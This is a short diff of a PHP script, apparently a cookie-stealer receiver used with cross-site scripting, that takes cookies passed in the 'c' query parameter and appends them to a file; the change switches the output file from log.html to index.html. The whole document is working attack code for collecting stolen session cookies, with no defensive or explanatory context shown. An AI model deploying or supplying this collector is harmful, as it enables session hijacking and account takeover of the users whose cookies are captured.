@@ -1,6 +1,6 @@
 <?php
 $cookies = $_GET["c"];
-$file = fopen("log.html", 'a');
+$file = fopen("index.html", 'a');
 fwrite($file, $cookies);
 fwrite($file, "\n\n");
 ?>
